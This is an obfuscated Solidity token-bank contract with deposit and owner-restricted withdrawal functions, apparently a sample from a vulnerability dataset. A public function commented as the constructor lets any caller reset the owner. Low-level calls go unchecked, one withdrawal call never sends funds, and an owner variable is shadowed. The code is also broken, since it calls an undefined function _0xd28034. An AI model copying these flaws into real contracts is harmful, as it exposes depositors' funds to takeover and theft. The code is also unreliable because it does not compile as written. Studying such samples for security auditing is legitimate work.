// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Ownable
{
    address _0x8b69f0;
    address _0x4ff469 = msg.sender;

    function _0x12df56(address _0xe38acb)
    public
    _0xcee9ba
    {
        _0x8b69f0 = _0xe38acb;
    }

    function _0xa204fe()
    public
    {
        if(msg.sender==_0x8b69f0)
        {
            _0x4ff469=_0x8b69f0;
        }
    }

    modifier _0xcee9ba
    {
        if(_0x4ff469 == msg.sender)_;
    }
}

contract Token is Ownable
{
    address _0x4ff469 = msg.sender;
    function WithdrawToken(address _0x0c1e6e, uint256 _0x178220,address _0x352abe)
    public
    _0xcee9ba
    {
        _0x0c1e6e.call(bytes4(_0xd28034("transfer(address,uint256)")),_0x352abe,_0x178220);
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;

     ///Constructor
    function _0x5580e9()
    public
    {
        _0x4ff469 = msg.sender;
        MinDeposit = 1 ether;
    }

    function()
    payable
    {
        Deposit();
    }

    function Deposit()
    payable
    {
        if(msg.value>MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }

    function WitdrawTokenToHolder(address _0x728b49,address _0xed74ae,uint _0xc11416)
    public
    _0xcee9ba
    {
        if(Holders[_0x728b49]>0)
        {
            Holders[_0x728b49]=0;
            WithdrawToken(_0xed74ae,_0xc11416,_0x728b49);
        }
    }

    function WithdrawToHolder(address _0xfee8ad, uint _0x2ca1c6)
    public
    _0xcee9ba
    payable
    {
        if(Holders[msg.sender]>0)
        {
            if(Holders[_0xfee8ad]>=_0x2ca1c6)
            {
                _0xfee8ad.call.value(_0x2ca1c6);
                Holders[_0xfee8ad]-=_0x2ca1c6;
            }
        }
    }

    function Bal() public constant returns(uint){return this.balance;}
}